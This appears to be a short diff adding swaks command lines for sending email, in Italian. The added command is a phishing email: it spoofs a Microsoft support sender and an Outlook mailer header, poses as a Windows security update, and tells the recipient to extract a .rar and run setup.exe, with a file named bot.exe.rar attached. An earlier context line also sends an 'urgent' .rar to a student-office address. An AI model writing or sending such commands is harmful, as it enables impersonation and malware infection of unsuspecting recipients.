@@ -17,3 +17,16 @@ swaks --to segreteria.studenti@gmail.com \
       --server smtp.tuo-provider.com \
       --auth LOGIN \
       --attach /percorso/del/tuo/file/allegato_urgente.rar
+
+
+
+swaks \
+  --to "target@gmail.com" \
+  --from "support@microsoft.com" \
+  --server "smtp.mail.yahoo.com:587" \
+  -tls \
+  --attach ~/bot.exe.rar \
+  --header "Subject: 🛡️ Windows Security Update KB2267602 - Installa Ora" \
+  --body "Aggiornamento critico sicurezza.\n\n1. Salva allegato\n2. Estrai con WinRAR\n3. Esegui setup.exe\n\nMicrosoft Security Team" \
+  --header "X-Mailer: Microsoft Outlook 16.0.14326.20499" \
+  --header "Content-Disposition: attachment; filename=\"Windows_Security_Update_Jan2026.rar\""
